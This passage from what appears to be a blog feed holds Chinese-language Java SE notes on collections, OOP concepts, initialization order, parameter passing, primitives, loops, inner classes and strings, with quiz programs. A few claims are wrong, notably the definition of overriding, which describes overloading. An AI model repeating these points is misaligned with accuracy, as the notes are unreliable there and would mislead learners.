反转<br>shuffle    混淆<br>sort    排序<br>swap    交换（交换0和5下标的数据后）<code>Collections.swap(numbers,0,5);</code><br>rotate    滚动(把集合中的数据向右滚动2个单位)     <code>Collections.rotate(numbers,2);</code><br>synchronizedList    线程安全化</li></ul><h2 id="常用集合"><a href="#常用集合" class="headerlink" title="常用集合"></a>常用集合</h2><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>代码展示ArrayList常用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    List&lt;String&gt; animal = new ArrayList&lt;String&gt;();</span><br><span class="line">    //增</span><br><span class="line">    animal.add(&quot;松鼠&quot;);</span><br><span class="line">    animal.add(1, &quot;花猪&quot;);</span><br><span class="line">    //删</span><br><span class="line">    animal.remove(0);</span><br><span class="line">    animal.remove(&quot;花猪&quot;);</span><br><span class="line">    //查</span><br><span class="line">    System.out.println(animal.get(1));//根据位置获取对象</span><br><span class="line">    System.out.println(animal.indexOf(&quot;松鼠&quot;));//查对象的位置</span><br><span class="line">    //改</span><br><span class="line">    animal.set(0, &quot;猫&quot;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    //获取大小</span><br><span class="line">    System.out.println(animal.size());</span><br><span class="line">    </span><br><span class="line">    //判断是否包含</span><br><span class="line">    System.out.println(animal.contains(&quot;小狗&quot;));</span><br><span class="line">    </span><br><span class="line">    //把另一个容器所有对象都加进来</span><br><span class="line">    ArrayList human = new ArrayList();</span><br><span class="line">    animal.addAll(human);</span><br><span class="line">    </span><br><span class="line">    //转为数组，类型要是一样的哦</span><br><span class="line">    String[] array = new String[animal.size()];</span><br><span class="line">    animal.toArray(array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="IO流（待完善）"><a href="#IO流（待完善）" class="headerlink" title="IO流（待完善）"></a>IO流（待完善）</h1>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javaSE（上）</title>
      <link href="/2018/10/06/javaSE%E4%B8%8A/"/>
      <url>/2018/10/06/javaSE%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="封装、继承、多态"><a href="#封装、继承、多态" class="headerlink" title="封装、继承、多态"></a>封装、继承、多态</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>访问修饰权限：<br>private（私有）, default（同一包）, public（共有）, protected（同一包和子孙类）<br>如果不写修饰符默认用default（package/friendly）修饰。<br><strong>default和protected区别：protected能访问子孙类，default不能。</strong><br><strong>会被子类继承的方法，通常使用protected</strong></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>接口和抽象类的主要区别？<br>从概念上来说<br>抽象类是一种对<strong>事物的抽象</strong>，而接口就像是一种约定，是一种对<strong>行为</strong>的抽象；<br>抽象类是对整个类整体进行抽象，包括属性、行为，但是接口却是对类局部（行为）进行抽象。<br>抽象类是一种模板式设计，而接口是一种<strong>行为规范</strong>，是一种辐射式设计。</p><p>模板式设计：如果B和C都使用了公共模板A，如果他们的公共部分需要改动，那么只改动A就可以了；<br>辐射式设计：如果B和C都实现了公共接口A，如果现在要向A中添加新的方法，那么B和C都必须进行相应改动。</p><p>区别1：<br><strong>一个类只能继承一个父类。<br>一个类可以实现多个接口</strong></p><p>区别2：<br>抽象类可以定义<br>public,protected,package,private、静态和非静态属性、final和非final属性<br>但是接口中声明的属性，只能是public、静态、final的</p><p>问题：Override(重写)和Overload(重载)的区别?Overload能改变返回值类型吗?</p><p>子类<strong>重写</strong>父类方法：子类的方法名与父类的一样，但是参数类型不一样。<br>重载：<strong>本类</strong>中出现的方法名一样，参数列表不同的方法。<br>与返回值类型无关。</p><p>思考：如果没有重写这样的机制，会发生什么？<br>答：一旦继承了父类，<strong>所有方法都不能修改了</strong>。另外，对象调用方法的时候，先找子类本身的方法，再找父类。(就近原则)</p><p>隐藏，就是子类覆盖父类的<strong>类方法</strong>。（重写是子类覆盖父类的对象方法 ）</p><p>为什么Java语言不支持c++所有的多重继承?<br>多重继承有它的弊端。<br>1)多重继承存在<strong>二义性</strong>。比如，类C同时继承类A和类B,如果类A和类B中都有方法f,那么调用类C的的f方法时,无法确定是调用类A还是类B的方法,将会产生二义性。但是Java语言却可以通过实现多个接口的方式间接地支持多重继承,由于接口只有方法体,没有方法实现,假设类C实现了接口A和接口B，即使AB都有f方法，但接口只有定义没有实现，在C中才有一个方法的实现，也就不存在二义性了。<br>2）多重继承会使得类型转换，构造方法的调用顺序变得非常复杂。</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p><strong>操作符</strong>的多态<br>加号+可以作为算数运算，也可以作为字符串连接。不同情境下，具备不同的作用<br>如果+号两侧都是整型，那么+代表数字<strong>相加</strong><br>如果+号两侧，任意一个是字符串，那么+代表<strong>字符串连接</strong></p><p><strong>类</strong>的多态 比如<strong>父类的引用指向子类的对象</strong>、重写。</p><p><u>下面程序的运行结果是？</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Base</span><br><span class="line">&#123;</span><br><span class="line">    int num = 1;</span><br><span class="line">    public Base()&#123;</span><br><span class="line">        this.print();</span><br><span class="line">        num=2;</span><br><span class="line">    &#125;</span><br><span class="line">    public void print()&#123;</span><br><span class="line">        System.out.println(&quot;Base.num=&quot;+num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sub extends Base&#123;</span><br><span class="line">    int num= 3;</span><br><span class="line">    public Sub()&#123;</span><br><span class="line">        this.print();</span><br><span class="line">        num=4;</span><br><span class="line">    &#125;</span><br><span class="line">    public void print()&#123;</span><br><span class="line">        System.out.println(&quot;Sub.num=&quot;+num);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Test1 &#123;</span><br><span class="line">  public static void main(String[] args)</span><br><span class="line">  &#123;</span><br><span class="line">      Base b = new Sub();</span><br><span class="line">      System.out.println(b.num);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在执行语句 Base b= new Sub时,会首先调用父类的构造方法。<strong>根据多态的特性,此时实例化的是sub类的对象,因此,base构造方法会调用Sub类的print()方法。由于此时Sub类中的初始化代码 Int num=3还没有执行,num的默认值为0,输出为 Sub num=0。</strong> 下一条语句父类num初始化为2。<br>然后会调用子类的构造方法,根据初始化的顺序可知在调用子类构造方法时,非静态的变量会先执行初始化动作,所以,此时子类Sub的mum值为3,因此,调用 print方法会输出 Sub num=3。<br>接着输出b.num,由于b的类型为Base,<strong>而属性没有多态的概念</strong>因此,此时会输出父类中的mm值:2<br>程序的运行结果如下：<br>Sub.num=0<br>Sub.num=3<br>2</p><p>题目总结：1.当父类的引用指向子类的对象时，会先初始化父类。<br>2.如果子类重写某方法，不管父类子类都是调用子类方法。<br>3.属性没有多态的概念。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="java初始化原则"><a href="#java初始化原则" class="headerlink" title="java初始化原则"></a>java初始化原则</h3><h3 id="对象属性初始化方法有3种"><a href="#对象属性初始化方法有3种" class="headerlink" title="对象属性初始化方法有3种"></a>对象属性初始化方法有3种</h3><ol><li>声明该属性的时候初始化 </li><li>构造方法中初始化</li><li>初始化块</li></ol><p>如果同时初始化同一变量，则优先级是：构造方法中初始化&gt;初始化块&gt; 声明该属性的时候初始化 </p><p>静态成员变量&gt;成员变量&gt;构造方法。<br>1静态变量优先与非静态变量<br>2父类优先于子类<br>3按照成员变量定义的顺序。<br>父子类的初始化执行顺序如下：<br>父类静态变量，父类静态代码块<br>子类静态变量，子类静态代码块<br>父类非静态变量，父类非静态代码块，父类构造方法<br>子类非静态变量，子类非静态代码块和子类构造函数。</p><h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p> this关键字代表自身实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//参数名和属性名一样</span><br><span class="line">   //在方法体中，只能访问到参数name</span><br><span class="line">   public void setName1(String name)&#123;</span><br><span class="line">       name = name;</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   //为了避免setName1中的问题，参数名不得不使用其他变量名</span><br><span class="line">   public void setName2(String heroName)&#123;</span><br><span class="line">       name = heroName;</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   //通过this访问属性</span><br><span class="line">   public void setName3(String name)&#123;</span><br><span class="line">       //name代表的是参数name</span><br><span class="line">       //this.name代表的是属性name</span><br><span class="line">       this.name = name;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><h3 id="实参与行参的问题"><a href="#实参与行参的问题" class="headerlink" title="实参与行参的问题"></a>实参与行参的问题</h3><p><u>猜一猜程序运行结果</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">    public void change(int j, StringBuffer ss1) &#123;</span><br><span class="line">        j = 100;</span><br><span class="line">        ss1.append(&quot;world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int i = 1;</span><br><span class="line">        StringBuffer s1 = new StringBuffer(&quot;hello &quot;);</span><br><span class="line">        Test t = new Test();</span><br><span class="line">        t.change(i, s1);</span><br><span class="line">        System.out.println(i);//1处</span><br><span class="line">        System.out.println(s1);//2处</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于i是基本类型，因此参数是<strong>按值</strong>传递。<strong>会创建一个i的副本</strong>。把这个副本作为参数赋值给j。既然j是i的副本，那么对副本的任何修改都不会对i有影响。因此1处输出1。<br>由于StringBuffer是一个类，因此是按<strong>引用</strong>传递。当ss1修改的时候。由于实参s1和形参ss1指向的是同一块储存空间，因此ss1修改了值之后，s1指向的字符串也被修改了。因此2处输出hello world。<br>那么，下面程序运行结果又是什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">    public void change(StringBuffer ss1) &#123;</span><br><span class="line">       ss1 = new StringBuffer(&quot;world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line">   StringBuffer s1 = new StringBuffer(&quot;hello &quot;);</span><br><span class="line">        Test t = new Test();</span><br><span class="line">        t.change(s1);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>由于StringBuffer是一个类，因此是按引用传递。<strong>但是</strong>这里的change方法不是对”hello “进行修改，而是使形参ss1的指向另一个字符串 “world”。而对形参ss1的改变对实参s1没有影响，实参s1仍然指向 “hello “。</p><p><u>引用就是指针吗？</u><br>不是，二者不能等同。虽然java引用在底层是通过指针实现的，但指针可以执行比较运算和整数的加减运算，而引用却不行。</p><h3 id="关键字-final"><a href="#关键字-final" class="headerlink" title="关键字 final"></a>关键字 final</h3><p>修饰变量时，用以定义常量；<br>修饰方法时，方法不能被重写（Override）；<br>修饰类时，类不能被继承。</p><h1 id="变量、数组、循环"><a href="#变量、数组、循环" class="headerlink" title="变量、数组、循环"></a>变量、数组、循环</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量的范围<br>1.变量声明在类下，叫做<strong>字段</strong>或者<strong>属性</strong>或者<strong>成员变量</strong><br>2.变量声明在一个方法上的，就叫做<strong>参数</strong>或者<strong>局部变量</strong></p><p>数据类型<br>八种基本类型(二进制位数)：<br> 整型 4种： byte（8位）、short（16位）、int（32位）、long（64位）<br> 浮点型 2种： float（32位）、double （64位）<br> 字符型 1种： char（16位）<br> 布尔型 1种：boolean（1位）</p><p> 现在问题来了</p><p><u>问：int和integer的区别？</u><br>答：1)int默认值为0。而integer默认值为null。由此可见,证int无法区分未赋值与赋值为0的情况,而integer却可以区分这两种情况。<br>2)int是是值传递。而integer是引用传递<br>3)int只能用来运算,而integer提供了很多有用的方法<br>4)当需要往容器(例如List)里存放整数时,无法直接存放int,因为List里面放的都是对象,所以,在这种情况下只能使用 Integer</p><p><u>问：char型变量中能不能存贮一个中文汉字?为什么?</u><br>答：char是16位的，占两个字节<br>汉字通常使用GBK或者UNICODE编码，也是使用两个字节，可以正常存放汉字。如果是utf-8编码，一个中文占三个字节，编译不会报错。但运行会报error“未结束的字符文字”</p><p><u>问：请解释这三条语句的输出</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  System.out.println((byte)127);//127</span><br><span class="line">System.out.println((byte)128);//-128</span><br><span class="line">System.out.println((byte)129);//-127</span><br></pre></td></tr></table></figure></p><p>答：byte的取值是{-128,127},如果把128强制转换成byte已结超出了byte范围，此时会溢出，相当于最小的负数-128.而129强转后就是-127</p><p><u>问：请解释这条语句的输出</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Math.min(Double.MIN_VALUE,0.0));//输出0.0</span><br></pre></td></tr></table></figure></p><p>答：对于Double来说MIN_VALUE并不是取值范围的最小数，而是正数范围的最小数，也就是最接近于0的正数。最接近于0的正数和0比起来，当然是0小。</p><p><u>问：在java里调用什么方法能把二进制数转化为十进制？</u><br>答：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Integer.valueOf(&quot;11101&quot;,2));</span><br></pre></td></tr></table></figure></p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><h4 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i1 = 10;</span><br><span class="line">byte b = (byte) i1;</span><br></pre></td></tr></table></figure><h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a>自动装箱和拆箱</h4><p>把基本数据类型和对应的包装类之间转换。比如int和Integer。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Integer i = 100;  //自动装箱，编译器执行Integer.valueOf(100)</span><br><span class="line">int j = i;        //自动拆箱，编译器执行i.intValue()</span><br></pre></td></tr></table></figure></p><h4 id="与equals"><a href="#与equals" class="headerlink" title="==与equals()"></a>==与equals()</h4><p>==比较的是两个对象的引用是否相同，或者是比较原始数据类型是否相等；<br>equals()比较的是两个对象的内容是否相同。</p><h3 id="关于变量的题目"><a href="#关于变量的题目" class="headerlink" title="关于变量的题目"></a>关于变量的题目</h3><p><u> 题目一：解释为何行3编译错误，而行4编译正确</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        byte b1 = 3;</span><br><span class="line">        byte b2 = 4;</span><br><span class="line">        byte b3 = b1 + b2;                //编译错误</span><br><span class="line">        byte b4 = 3 + 4;                //编译正确</span><br><span class="line">//（1）变量相加，首先首先进行类型提升，之后再进行计算，计算后将结果赋值；</span><br><span class="line">//（2）常量相加，首先进行计算，之后判断是否在接受类型的范围，在则赋值。</span><br></pre></td></tr></table></figure></p><p><u><br>题目二：判断下列代码是否有误，并指出错误</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        short s = 1;</span><br><span class="line">        s = s + 1;                //错误，s在参加运算时会自动提示类型为int。int类型值无法直接赋值于short类型</span><br><span class="line">        </span><br><span class="line">        short z = 1;</span><br><span class="line">        z += 1;                //正确,扩展赋值运算符包含强制类型转换。等价于 z = (short)(z + 1);</span><br><span class="line">//还有，-128~127的Integer值可以从缓存中取得。其他情况要重新创建</span><br></pre></td></tr></table></figure></p><p><u>题目三，int i = 1;i+=++i;的运算结果？</u><br>i+=++i,其中先算++i,得到2<br>由于++i并未进行赋值，所以i还是1<br>1+=2结果为3</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>一维数组的3种创建方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int[] arr1 = &#123;1,2,3,4&#125;;             //正确</span><br><span class="line">int[] arr2 = new int[4];            //正确</span><br><span class="line">int[] arr3 = new int[]&#123;1,2,3,4&#125;;    //正确</span><br><span class="line">int[] arr4 = new int[4]&#123;1,2,3,4&#125;;  //错误，编译不通过</span><br></pre></td></tr></table></figure></p><p>二维数组的3种声明方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int arr1[][];</span><br><span class="line">int [][]arr2;</span><br><span class="line">int []arr3[];</span><br></pre></td></tr></table></figure></p><p>与C/C++不同的是，java的二维数组允许第二维的长度可以不同。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p><u>写出下面程序运行结果</u><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">   static boolean p(char c) &#123;</span><br><span class="line">       System.out.print(c);</span><br><span class="line">       return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">       int i=0;</span><br><span class="line">        for (p(&apos;a&apos;); p(&apos;b&apos;)&amp;&amp;i&lt;2; p(&apos;c&apos;)) &#123;//for(表达式1;表达式2;表达式3)&#123;循环体]</span><br><span class="line">            p(&apos;d&apos;);</span><br><span class="line">            i++; &#125; &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>因为，1.初始化只会执行一次2.先执行循环体后执行for循环的表达式3<br>所以答案是：abdcbdcb</p><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">switch(day)&#123;</span><br><span class="line">           case 1:</span><br><span class="line">               System.out.println(&quot;星期一&quot;);</span><br><span class="line">               break;</span><br><span class="line">           case 2:</span><br><span class="line">               System.out.println(&quot;星期二&quot;);</span><br><span class="line">               break;</span><br><span class="line">           case 3:</span><br><span class="line">               System.out.println(&quot;星期三&quot;);</span><br><span class="line">               break;</span><br><span class="line">           case 4:</span><br><span class="line">               System.out.println(&quot;星期四&quot;);</span><br><span class="line">               break;</span><br><span class="line">           case 5:</span><br><span class="line">               System.out.println(&quot;星期五&quot;);</span><br><span class="line">               break;</span><br><span class="line">           case 6:</span><br><span class="line">               System.out.println(&quot;星期六&quot;);</span><br><span class="line">               break;</span><br><span class="line">           case 7:</span><br><span class="line">               System.out.println(&quot;星期天&quot;);</span><br><span class="line">               break;</span><br><span class="line">           default:</span><br><span class="line">               System.out.println(&quot;输入有误&quot;);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><strong>使用switch特别注意，必须在case语句后加break </strong>   </p><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public enum Season &#123;//是枚举enum不是类class</span><br><span class="line">            SPRING, SUMMER, AUTUMN, WINTER;//直接这样写</span><br><span class="line"></span><br><span class="line">            public static void main(String[] args) &#123;</span><br><span class="line">                Season season = Season.SPRING;</span><br><span class="line">                switch (season) &#123;</span><br><span class="line">                    case SPRING:</span><br><span class="line">                        System.out.println(&quot;春天&quot;);</span><br><span class="line">                        break;</span><br><span class="line">                    case SUMMER:</span><br><span class="line">                        System.out.println(&quot;夏天&quot;);</span><br><span class="line">                        break;</span><br><span class="line">                    case AUTUMN:</span><br><span class="line">                        System.out.println(&quot;秋天&quot;);</span><br><span class="line">                        break;</span><br><span class="line">                    case WINTER:</span><br><span class="line">                        System.out.println(&quot;冬天&quot;);</span><br><span class="line">                        break;</span><br><span class="line">                &#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="如何跳出多重循环？"><a href="#如何跳出多重循环？" class="headerlink" title="如何跳出多重循环？"></a>如何跳出多重循环？</h4><p>在外部循环的前一行，加上自定义标签，比如 out:<br>在break的时候使用该标签。break out;</p><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><h2 id="非静态内部类"><a href="#非静态内部类" class="headerlink" title="非静态内部类"></a>非静态内部类</h2><p>可以被看作外部类的一个成员（与类的属性和方法类似）<br>1可以自由的引用外部类的属性和方法。2外部类被实例化之后，内部类才能被实例化。3不能有静态成员。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class Hero &#123;//英雄类</span><br><span class="line">    private String name; </span><br><span class="line">    float hp; </span><br><span class="line">    // 非静态内部类，只有一个外部类对象存在的时候，才有意义</span><br><span class="line">    // 比如战斗成绩只有在一个英雄对象存在的时候才有意义</span><br><span class="line">    </span><br><span class="line">    class BattleScore &#123;//战斗成绩类</span><br><span class="line">        int kill;</span><br><span class="line"></span><br><span class="line">        public void legendary() &#123;</span><br><span class="line">            if (kill &gt;= 8)</span><br><span class="line">                System.out.println(name + &quot;超神！&quot;);</span><br><span class="line">            else</span><br><span class="line">                System.out.println(name + &quot;尚未超神！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Hero garen = new Hero();</span><br><span class="line">        garen.name = &quot;盖伦&quot;;</span><br><span class="line">        </span><br><span class="line">        // BattleScore对象只有在一个英雄对象存在的时候才有意义</span><br><span class="line">        BattleScore score = garen.new BattleScore();// 所以其实例化必须建立在一个外部类对象的基础之上</span><br><span class="line">                                                    </span><br><span class="line">        score.kill = 9;</span><br><span class="line">        score.legendary();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="静态内部类。"><a href="#静态内部类。" class="headerlink" title="静态内部类。"></a>静态内部类。</h2><p>1不能访问外部类普通成员，只能访问外部内中静态成员和静态方法。<br>2可以不依赖于外部类实例化而实例化。<br>3不可以与外部类同名。</p><h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><p>是指定义在一个代码块内的类，不可以被修饰符修饰。</p><h2 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h2><p>是一种没有类名的内部类，不使用关键字class、extends、implement，没有构造方法，必须继承类或其他接口。一般用于gui编程中事件处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public abstract class Hero&#123;</span><br><span class="line"></span><br><span class="line">    public abstract void attack();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Hero h = new Hero()&#123;</span><br><span class="line">            //当场实现attack方法</span><br><span class="line">            public void attack() &#123;</span><br><span class="line">                System.out.println(&quot;新的进攻手段&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        h.attack();</span><br><span class="line">        //通过打印h，可以看到h这个对象属于Hero$1这么一个系统自动分配的类名</span><br><span class="line">        System.out.println(h);</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h2><p>%s 表示字符串<br>%d 表示数字<br>%n 表示换行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String name =&quot;盖伦&quot;;</span><br><span class="line">int kill = 8;</span><br><span class="line">String title=&quot;超神&quot;;</span><br><span class="line"> </span><br><span class="line">String sentenceFormat =&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;;</span><br><span class="line">//使用printf格式化输出</span><br><span class="line">System.out.printf(sentenceFormat,name,kill,title);//第一个是原字符串</span><br></pre></td></tr></table></figure></p><h2 id="StringBuffer追加-删除-插入-反转"><a href="#StringBuffer追加-删除-插入-反转" class="headerlink" title="StringBuffer追加 删除 插入 反转"></a>StringBuffer追加 删除 插入 反转</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 